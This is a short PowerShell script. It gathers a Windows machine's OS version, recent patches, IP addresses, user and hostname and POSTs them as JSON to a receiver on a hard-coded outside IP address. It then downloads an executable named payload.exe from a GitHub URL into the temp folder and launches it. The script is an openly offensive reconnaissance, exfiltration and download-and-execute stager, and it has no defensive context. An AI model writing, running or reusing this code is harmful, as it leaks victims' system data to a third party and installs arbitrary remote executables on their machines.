# Collect system info
$sysInfo = @{
    OS = (Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture)
    Patches = (Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 3)
    IP = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" })
    User = (whoami)
    Host = (hostname)
}
$json = $sysInfo | ConvertTo-Json -Depth 3

# Send info to your PHP receiver (optional)
Invoke-RestMethod -Uri "http://5.62.193.232/receiver.php" -Method POST -Body $json

# Download and run the payload
$exePath = "$env:TEMP\payload.exe"
Invoke-WebRequest -Uri "http://github.com/RminBabaie/writing/blob/main/payload.exe" -OutFile $exePath
Start-Process $exePath
